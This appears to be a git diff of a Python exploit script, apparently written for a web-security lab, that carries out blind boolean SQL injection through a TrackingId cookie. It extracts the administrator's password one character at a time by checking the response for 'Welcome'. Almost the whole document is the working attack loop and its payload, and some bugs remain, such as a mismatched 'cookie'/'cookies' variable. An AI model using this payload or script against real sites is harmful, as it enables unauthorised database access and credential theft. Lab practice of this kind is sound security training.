@@ -1,17 +1,28 @@
 import sys
 import requests
 import urllib3
+import urllib
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())
 
-proxies = {'http: 127.0.0.1:8080', 'https: 127.0.0.1:8080'}
+proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}
 
-def sqki_password(url):
-   password = ""
+def sqli_password(url):
+   password_extracted = ""
    for i in range(1, 21):
       for j in range (32,126):
          sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--'" % (i,j)
-         sqli_payload_encoded = urllib.parse.quote(sqli payload)
+         sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+         cookie = {'TrackingId': 'tracking id here' + sqli_payload_encoded, 'session': 'your_session_cookie_here'}
+         r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+         if "Welcome" not in r.text:
+            sys.stdout.write('\r' + password_extracted)
+            sys.stdout.flush()
+         else:
+            password_extracted += chr(j)
+            sys.stdout.write('\r' + password_extracted)
+            sys.stdout.flush()
+            break
 
 def main():
    if len(sys.argv) != 2:
@@ -23,5 +34,5 @@ def main():
    sqli_password(url)
 
 
-      If __name__ == "__main__":
-        main()
+if __name__ == "__main__":
+   main()
